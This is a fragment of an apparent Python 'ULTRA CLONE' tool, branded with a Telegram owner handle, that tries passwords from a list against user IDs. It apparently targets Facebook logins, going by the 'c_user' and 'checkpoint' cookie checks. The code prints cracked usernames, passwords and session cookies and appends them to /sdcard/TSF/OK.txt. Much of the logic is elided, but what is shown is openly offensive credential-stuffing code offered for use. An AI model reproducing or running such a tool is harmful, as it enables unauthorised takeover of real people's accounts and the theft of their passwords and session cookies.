...
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Tool Name    : ULTRA CLONE       🔥                                               
┃ Owner           :  @BDCyberboy       🔥.                                                
┃ Telegram      : https://t.me/tsf_nr  ❤️.                                           
┃Support Us.   : https://t.me/tsf_nr. ❤️                                       
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def fuck():
    ...
    print(' [+] OK Ids saved in TSF/OK.txt')
    print(' [+] CP Ids saved in TSF/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[TSF]--[%s/%s]--[CP%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"""\033[1;92m[TSF-OK] ✅
Username : {uid} 
Password : {ps} 
\nCookie : {coki}
""")
#____cp____info 👇👇
                open('/sdcard/TSF/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[1;92m[TSF-CP] 
Username : {cid}
Password : {ps}
""")
